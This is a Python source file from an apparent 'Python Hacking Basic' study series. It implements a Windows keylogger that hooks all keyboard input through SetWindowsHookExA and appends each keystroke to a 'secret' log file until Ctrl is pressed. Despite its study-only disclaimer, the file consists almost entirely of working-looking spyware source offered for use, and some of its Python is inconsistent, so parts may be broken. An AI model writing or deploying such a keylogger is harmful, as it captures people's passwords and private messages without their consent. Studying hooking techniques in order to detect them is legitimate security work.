#!/usr/bin/env python
# -*- coding: utf-8 -*-

# This file is part of Python Hacking Basic
# NOTICE : only for STUDY purpose!!!!
# NOTICE : unauthorized hacking is ILLEGAL!!!
# March 2018

"""
[application_hacking]
- Message Hooking
"""

import sys
import datetime
import ctypes
import ctypes.wintypes


user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEY_DOWN = 0x0100
CTRL_CODE = 162

HOOKED_MESSAGE_FILE_NAME = '_hooked_message.txt'


class KeyLogger:
    """Sets new Hook-Chain, sniffs the messages."""
    global user32, kernel32

    def __init__(self):
        self._user32 = user32
        self.hooked = None

    def install_hook_process(self, pointer):
        self.hooked = self._user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    def uninstall_hook_process(self):
        if self.hooked is None:
            return
        self._user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


def get_function_ptr(fn):
    cmp_func = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    return cmp_func(fn)


def hook_process(n_code, w_param, l_param):
    global key_logger, HOOKED_MESSAGE_FILE_NAME

    if w_param is not WM_KEY_DOWN:
        return user32.CallNextHookEx(key_logger.hooked, n_code, w_param, l_param)
    hooked_key = chr(l_param[0])

    # Hooked message is kept in secret file
    with open(HOOKED_MESSAGE_FILE_NAME, 'at') as f:
        f.write(hooked_key.decode('cp1252').encode('utf-8'))

    # Stop key-logger if input is Ctrl
    if int(l_param[0]) == CTRL_CODE:
        # Print 'time of key-logger termination'
        print_key_logger_info(HOOKED_MESSAGE_FILE_NAME, hook_end=True)

        # Terminate key-logger
        key_logger.uninstall_hook_process()
        print('.. Key Logging End')

        sys.exit(-1)

    return user32.CallNextHookEx(key_logger.hooked, n_code, w_param, l_param)


def print_key_logger_info(file_name, hook_start=False, hook_end=False):
    now_time = str(datetime.datetime.now()).split('.')[0]
    if hook_start:
        with open(file_name, 'at') as f:
            start_message = '\n=== {0:<16} {1} ===\n'.format('Key-Logger Start', now_time)
            f.write(start_message)
        return None

    if hook_end:
        with open(file_name, 'at') as f:
            end_message = '\n=== {0:<16} {1} ===\n'.format('Key-Logger End', now_time)
            f.write(end_message)
        return None


"""
message hooking starts..
"""
if __name__ == '__main__':
    # Construct KeyLogger object and set ready for hookingw
    key_logger = KeyLogger()
    ptr = get_function_ptr(hook_process)
    key_logger.install_hook_process(ptr)
    msg = ctypes.wintypes.MSG()

    print('.. Create Log File')
    open(HOOKED_MESSAGE_FILE_NAME, 'wt').close()

    # Print 'time of key-logger start'
    print_key_logger_info(HOOKED_MESSAGE_FILE_NAME, hook_start=True)

    print('.. Key Logging Start')
    user32.GetMessageA(ctypes.byref(msg), 0, 0, 0)


